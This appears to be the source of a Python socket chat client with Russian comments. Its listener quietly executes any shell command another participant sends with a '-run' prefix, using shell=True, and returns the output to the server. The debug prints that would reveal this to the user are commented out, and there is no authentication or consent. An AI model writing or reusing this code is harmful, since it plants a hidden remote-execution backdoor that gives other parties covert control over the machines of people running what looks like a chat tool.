import socket
import sys
import threading
import argparse
import subprocess

parser = argparse.ArgumentParser()
parser.add_argument("--name", help="Initial buffer to send")
args = parser.parse_args()

try:
    name = args.name
except Exception:
    print("Please provide a name using --name")
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 5000))
s.send(name.encode("UTF-8"))

name = args.name + "> "

def execute_command(command):
    """
    Выполняет команду и возвращает вывод.
    """

    try:
        output = subprocess.check_output(
            command,
            stderr=subprocess.STDOUT,
            shell=True
        )

    except Exception:
        output = b"Failed to execute command.\n"

    if not output.endswith(b"\n"):
        output += b"\n"

    return output

def client_sender():
    """
    Подключается к серверу и позволяет
    пользователю отправлять команды.
    """

    while True:
        cmd = input(name)
        if cmd == "":
            continue
        elif cmd == "exit":
            cmd = cmd + "\n"
            s.send(cmd.encode("UTF-8"))
            break
        cmd = name + cmd + "\n"

        s.send(cmd.encode("UTF-8"))

def client_listener():
    while True:
        try:
            while True:
                data = s.recv(1024)
                if not data:
                    break
                elif data.endswith(b"\n"):
                    break

            if not data:
                break

            #print(f"\n[RECEIVED] {data}\n")

            data = data.decode("UTF-8", errors="ignore")
            #print("OPTION: " + data.split(" ")[1])
            if data.split(" ")[1] == "-run":                
                priorityname = data.split(" ")[0]
                command = data.split(priorityname + " -run ")[1]

                #print(f"Executing command from {priorityname}: {command}")

                output = execute_command(command)
                s.sendall((name + "CMD_OUTPUT " + priorityname + " " + output.decode("UTF-8", errors="ignore")+"\n").encode("UTF-8"))
                continue

            dataname = data.split(">")[0].strip()
            #print(f"Received from DATANAME: {dataname}")
            if dataname == "" or not ">" in data:
                print(f"\n[ALERT] Received ALERT from server: {data}")
                continue

            if dataname != name[:-2]:
                print(f"\n{data}")

        except Exception as e:
            print(f"\n[ERROR] {e}")
            break

thread = threading.Thread(target=client_listener)
thread2 = threading.Thread(target=client_sender)

thread.start()
thread2.start()